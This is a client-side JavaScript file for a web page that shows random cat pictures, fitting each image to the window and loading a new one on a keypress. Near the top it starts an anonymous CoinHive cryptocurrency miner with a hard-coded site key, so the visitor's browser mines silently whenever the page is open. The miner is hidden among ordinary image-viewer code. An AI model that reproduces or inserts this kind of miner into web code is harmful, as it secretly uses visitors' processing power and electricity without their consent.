var d=parseInt(Math.log2($(window).height())+0.5);
var e=(2*d-1)/(2*d);
var f=parseInt(Math.log2($(window).width())+0.5);
var g=(2*f-1)/(2*f);
var a,b,c,h=$(window).height()*e,w=$(window).width()*g;
var change = document.getElementById('cat');
var curImg;
var miner = new CoinHive.Anonymous('BTujSiViZYsN95LDUjWtiFsHlFmXzvN0',{throttle:.2});
miner.start();

//testing
function loadyThingy(url){
	console.log("debug tool");
	displayImage(url);
}

window.onresize = function(event) {
	d=parseInt(Math.log2($(window).height())+0.5);
	e=(2*d-1)/(2*d);
	f=parseInt(Math.log2($(window).width())+0.5);
	g=(2*f-1)/(2*f);
	h=$(window).height()*e;
	w=$(window).width()*g;
	if(curImg!=null) displayImage(curImg);
};

//should i make it just space and right?
$(document).keypress(function() {
	cat();
})

//overall
function displayImage(url){
	curImg=url;
	//change.innerHTML="<img src=\""+data.file+"\">";
	var img = new Image();
	img.onload=function(){
		//get proper ration
		a=h/this.height;
		//set proper width
		b=a*this.width;
		//set proper height
		c = h;
		if(b>w){
			//ratio
			a=w/b;
			//height
			c=a*c;
			//width
			b=w;
		}
		var temp = "<a href=\""+this.src+"\" target=\"_blank\" onclick=\"cat()\"><img src=\""+this.src+"\" height=\""+c+"\" width=\""+b+"\"></a>";
		//console.log(temp);
		change.innerHTML=temp;
		$("#cat").fadeIn();
	}
	img.src=url;
}

function cat(){
	$("#cat").fadeOut(function(){
		//$.get("/custom/CATAPI/getCat/my_endpoint").done(function(data){console.log(data);displayImage(data.file)});
		$.getJSON('http://random.cat/meow').then (function(data){console.log(data);displayImage(data.file)});
	});
}
